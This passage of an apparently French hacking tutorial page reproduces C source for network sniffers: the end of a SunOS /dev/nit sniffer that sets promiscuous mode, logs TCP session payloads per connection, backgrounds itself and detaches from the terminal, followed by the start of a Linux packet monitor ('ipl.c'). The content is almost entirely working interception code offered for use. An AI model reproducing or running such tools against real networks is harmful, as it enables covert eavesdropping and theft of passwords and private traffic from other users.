<br><tt><font color="#FF0000">&nbsp; fprintf(LOG,"%s[%s]\n", inet_ntoa(IPD),SERVp(TCPD));</font></tt>
<br><tt><font color="#FF0000">&nbsp;}</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; if( CLm = GET_NODE(IPS, TCPS,
IPD, TCPD) ) {</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CLm->PKcnt++;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(length>0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if( (CLm->Length + length) &lt; MAXBUFLEN ) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ADDDATA_NODE( CLm, p,length);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
} else {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
END_NODE( CLm, p,length, "DATA LIMIT");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
}</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(TCPFL(TH_FIN|TH_RST))
{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
END_NODE( CLm, (u_char *)NULL,0,TCPFL(TH_FIN)?"TH_FIN":"TH_RST" );</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; } else {</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(TCPFL(TH_SYN))
{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ADD_NODE(IPS,IPD,TCPS,TCPD,p,length);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; IDLE_NODE();</font></tt>
<p><tt><font color="#FF0000">&nbsp;}</font></tt>
<p><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">/* signal handler</font></tt>
<br><tt><font color="#FF0000">&nbsp;*/</font></tt>
<br><tt><font color="#FF0000">void death()</font></tt>
<br><tt><font color="#FF0000">{ register struct CREC *CLe;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; while(CLe=CLroot)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
END_NODE( CLe, (u_char *)NULL,0, "SIGNAL");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; fprintf(LOG,"\nLog ended
at => %s\n",NOWtm());</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; fflush(LOG);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(LOG != stdout)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
fclose(LOG);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; exit(1);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">/* opens network interface, performs ioctls
and reads from it,</font></tt>
<br><tt><font color="#FF0000">&nbsp;* passing data to filter function</font></tt>
<br><tt><font color="#FF0000">&nbsp;*/</font></tt>
<br><tt><font color="#FF0000">void do_it()</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; int cc;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; char *buf;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; u_short sp_ts_len;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(!(buf=malloc(CHUNKSIZE)))</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: malloc");</font></tt>
<p><tt><font color="#FF0000">/* this /dev/nit initialization code pinched
from etherfind */</font></tt>
<br><tt><font color="#FF0000">&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; struct strioctl si;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; struct ifreq&nbsp;&nbsp;&nbsp;
ifr;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; struct timeval&nbsp; timeout;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; u_int&nbsp; chunksize
= CHUNKSIZE;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; u_long if_flags&nbsp;
= NI_PROMISC;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if((if_fd = open(NIT_DEV,
O_RDONLY)) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: nit open");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(ioctl(if_fd, I_SRDOPT,
(char *)RMSGD) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl (I_SRDOPT)");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_timout = INFTIM;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(ioctl(if_fd, I_PUSH,
"nbuf") &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl (I_PUSH \"nbuf\")");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; timeout.tv_sec = 1;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; timeout.tv_usec = 0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_cmd = NIOCSTIME;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_len = sizeof(timeout);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_dp&nbsp; = (char
*)&amp;timeout;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(ioctl(if_fd, I_STR,
(char *)&amp;si) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl (I_STR: NIOCSTIME)");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_cmd = NIOCSCHUNK;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_len = sizeof(chunksize);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_dp&nbsp; = (char
*)&amp;chunksize;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(ioctl(if_fd, I_STR,
(char *)&amp;si) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl (I_STR: NIOCSCHUNK)");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; strncpy(ifr.ifr_name, device,
sizeof(ifr.ifr_name));</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; ifr.ifr_name[sizeof(ifr.ifr_name)
- 1] = '\0';</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_cmd = NIOCBIND;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_len = sizeof(ifr);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_dp&nbsp; = (char
*)&amp;ifr;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(ioctl(if_fd, I_STR,
(char *)&amp;si) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl (I_STR: NIOCBIND)");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_cmd = NIOCSFLAGS;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_len = sizeof(if_flags);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_dp&nbsp; = (char
*)&amp;if_flags;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(ioctl(if_fd, I_STR,
(char *)&amp;si) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl (I_STR: NIOCSFLAGS)");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(ioctl(if_fd, I_FLUSH,
(char *)FLUSHR) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl (I_FLUSH)");</font></tt>
<br><tt><font color="#FF0000">&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; while ((cc = read(if_fd,
buf, CHUNKSIZE)) >= 0) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
register char *bp = buf,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*bufstop = (buf + cc);</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
while (bp &lt; bufstop) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
register char *cp = bp;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
register struct nit_bufhdr *hdrp;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
hdrp = (struct nit_bufhdr *)cp;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cp += sizeof(struct nit_bufhdr);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
bp += hdrp->nhb_totlen;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
filter(cp, (u_long)hdrp->nhb_msglen);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
}</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; Pexit((-1),"Eth: read");</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<br><tt><font color="#FF0000">&nbsp;/* Yo Authorize your proogie,generate
your own password and uncomment here */</font></tt>
<br><tt><font color="#FF0000">/* #define AUTHPASSWD "EloiZgZejWyms"</font></tt>
<p><tt><font color="#FF0000">void getauth()</font></tt>
<br><tt><font color="#FF0000">{ char *buf,*getpass(),*crypt();</font></tt>
<br><tt><font color="#FF0000">&nbsp; char pwd[21],prmpt[81];</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; strcpy(pwd,AUTHPASSWD);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; sprintf(prmpt,"(%s)UP?
",ProgName);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; buf=getpass(prmpt);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(strcmp(pwd,crypt(buf,pwd)))</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
exit(1);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; */</font></tt>
<br><tt><font color="#FF0000">void main(argc, argv)</font></tt>
<br><tt><font color="#FF0000">int argc;</font></tt>
<br><tt><font color="#FF0000">char **argv;</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp; cbuf[BUFSIZ];</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; struct ifconf ifc;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;
s,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ac=1,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
backg=0;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; ProgName=argv[0];</font></tt>
<p><tt><font color="#FF0000">&nbsp;/*&nbsp;&nbsp;&nbsp;&nbsp; getauth();
*/</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; LOG=NULL;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; device=NULL;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; while((ac&lt;argc) &amp;&amp;
(argv[ac][0] == '-')) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; register
char ch = argv[ac++][1];</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; switch(toupper(ch))
{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case 'I': device=argv[ac++];</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case 'F': if(!(LOG=fopen((LogName=argv[ac++]),"a")))</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Zexit(1,"Output file cant be opened\n");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case 'B': backg=1;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case 'D': debug=1;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
default : fprintf(ERR,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
"Usage: %s [-b] [-d] [-i interface] [-f file]\n",</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ProgName);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
exit(1);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(!device) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if((s=socket(AF_INET, SOCK_DGRAM, 0)) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: socket");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ifc.ifc_len = sizeof(cbuf);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ifc.ifc_buf = cbuf;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if(ioctl(s, SIOCGIFCONF, (char *)&amp;ifc) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
close(s);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
device = ifc.ifc_req->ifr_name;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; fprintf(ERR,"Using logical
device %s [%s]\n",device,NIT_DEV);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; fprintf(ERR,"Output to
%s.%s%s",(LOG)?LogName:"stdout",</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(debug)?" (debug)":"",(backg)?" Backgrounding ":"\n");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(!LOG)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
LOG=stdout;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; signal(SIGINT, death);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; signal(SIGTERM,death);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; signal(SIGKILL,death);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; signal(SIGQUIT,death);</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(backg &amp;&amp; debug)
{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
fprintf(ERR,"[Cannot bg with debug on]\n");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
backg=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(backg) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
register int s;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if((s=fork())>0) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
fprintf(ERR,"[pid %d]\n",s);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
exit(0);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
} else if(s&lt;0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"fork");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if( (s=open("/dev/tty",O_RDWR))>0 ) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ioctl(s,TIOCNOTTY,(char *)NULL);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
close(s);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
}</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; fprintf(LOG,"\nLog started
at => %s [pid %d]\n",NOWtm(),getpid());</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; fflush(LOG);</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; do_it();</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<br>&nbsp;
<ul>
<li>
<font color="#000000">A faire tourner sous Linux, et toujours des sniffers,
linux_sniffer. A compiler en C:</font></li>
</ul>
<tt><font color="#FF0000">/* ipl.c 1/3/95&nbsp;&nbsp;&nbsp; by loq */</font></tt>
<br><tt><font color="#FF0000">/* monitors ip packets for Linux */</font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/types.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/socket.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/time.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/in.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;linux/if.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;signal.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;stdio.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;linux/socket.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;linux/ip.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;linux/tcp.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;linux/if_ether.h></font></tt>
<p><tt><font color="#FF0000">#define BUFLEN 8192</font></tt>
<br><tt><font color="#FF0000">#define ETHLINKHDR 14</font></tt>
<br>&nbsp;
<p><tt><font color="#FF0000">print_data(int count, char *buff)</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;int i,j,c;</font></tt>
<br><tt><font color="#FF0000">&nbsp;int printnext=1;</font></tt>
<br><tt><font color="#FF0000">&nbsp;if(count)</font></tt>
<br><tt><font color="#FF0000">&nbsp;{</font></tt>
<br><tt><font color="#FF0000">&nbsp;if(count%16)</font></tt>
<br><tt><font color="#FF0000">&nbsp; c=count+(16-count%16);</font></tt>
<br><tt><font color="#FF0000">&nbsp;else c=count;</font></tt>
<br><tt><font color="#FF0000">&nbsp;}</font></tt>
<br><tt><font color="#FF0000">&nbsp; else</font></tt>
<br><tt><font color="#FF0000">&nbsp; c=count;</font></tt>
<br><tt><font color="#FF0000">&nbsp;for(i=0;i&lt;c;i++)</font></tt>
<br><tt><font color="#FF0000">&nbsp;{</font></tt>
<br><tt><font color="#FF0000">&nbsp; if(printnext) { printnext--; printf("%.4x
",i&amp;0xffff); }</font></tt>
<br><tt><font color="#FF0000">&nbsp; if(i&lt;count)</font></tt>
<br><tt><font color="#FF0000">&nbsp; printf("%3.2x",buff[i]&amp;0xff);</font></tt>
<br><tt><font color="#FF0000">&nbsp; else</font></tt>
<br><tt><font color="#FF0000">&nbsp; printf("&nbsp;&nbsp; ");</font></tt>
<br><tt><font color="#FF0000">&nbsp; if(!((i+1)%8))</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if((i+1)%16)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; printf(" -");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; else</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; printf("&nbsp;&nbsp;
");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; for(j=i-15;j&lt;=i;j++)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(j&lt;count)
{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( (buff[j]&amp;0xff)
>= 0x20 &amp;&amp;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(buff[j]&amp;0xff)&lt;=0x7e)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
printf("%c",buff[j]&amp;0xff);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else printf(".");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else printf("
");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; printf("\n"); printnext=1;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;}</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">int</font></tt>
